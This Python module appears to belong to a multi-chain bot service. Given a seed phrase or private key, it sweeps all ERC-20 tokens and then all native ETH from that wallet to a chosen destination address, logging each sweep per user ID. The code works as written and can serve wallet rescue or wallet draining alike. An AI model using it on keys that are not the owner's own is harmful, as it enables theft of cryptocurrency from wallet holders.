from web3 import Web3
from eth_account import Account
from config import ETH_RPC_URL
from chains.tokens import ETH_TOKENS, sweep_tokens, get_token_balances, GAS_LIMIT_NATIVE

Account.enable_unaudited_hdwallet_features()

w3 = Web3(Web3.HTTPProvider(ETH_RPC_URL, request_kwargs={"timeout": 30}))

CHAIN_ID = 1
SYMBOL = "ETH"

def get_account(secret: str):
    s = secret.strip()
    if len(s.split()) >= 12:
        return Account.from_mnemonic(s)
    return Account.from_key(s if s.startswith("0x") else "0x" + s)

def get_balance(address: str) -> float:
    try:
        return float(Web3.from_wei(w3.eth.get_balance(Web3.to_checksum_address(address)), "ether"))
    except Exception:
        return 0.0

def get_all_balances(address: str) -> dict:
    balances = {}
    try:
        native = get_balance(address)
        if native > 0:
            balances["ETH"] = native
    except Exception:
        pass
    token_bals = get_token_balances(w3, address, ETH_TOKENS)
    balances.update(token_bals)
    return balances

def forward(secret: str, destination: str, user_id: int) -> list:
    results = []
    try:
        account = get_account(secret)
        address = account.address
        dest = Web3.to_checksum_address(destination)
        gas_price = w3.eth.gas_price

        # 1. Sweep all ERC-20 tokens first (while we still have gas money)
        token_results = sweep_tokens(w3, account, destination, ETH_TOKENS, CHAIN_ID, SYMBOL)
        for r in token_results:
            results.append({"chain": "ethereum", **r})

        # 2. Sweep native ETH last
        balance = w3.eth.get_balance(address)
        fee = gas_price * GAS_LIMIT_NATIVE

        if balance <= fee:
            results.append({
                "chain": "ethereum", "asset": "ETH", "status": "skip",
                "amount": float(Web3.from_wei(balance, "ether")),
                "tx_hash": None,
                "error": f"Balance {Web3.from_wei(balance,'ether'):.8f} ETH too low for gas",
            })
            return results

        value = balance - fee
        amount_eth = float(Web3.from_wei(value, "ether"))
        nonce = w3.eth.get_transaction_count(address, "pending")

        tx = {
            "to": dest, "value": value, "gas": GAS_LIMIT_NATIVE,
            "gasPrice": gas_price, "nonce": nonce, "chainId": CHAIN_ID,
        }
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction).hex()

        results.append({
            "chain": "ethereum", "asset": "ETH", "status": "success",
            "amount": amount_eth, "tx_hash": tx_hash, "error": None,
        })
        print(f"[ETH] Swept {amount_eth:.8f} ETH user={user_id} tx={tx_hash[:14]}...")

    except Exception as e:
        results.append({
            "chain": "ethereum", "asset": "ETH", "status": "error",
            "amount": 0, "tx_hash": None, "error": str(e)[:200],
        })
        print(f"[ETH ERROR] user={user_id}: {e}")

    return results
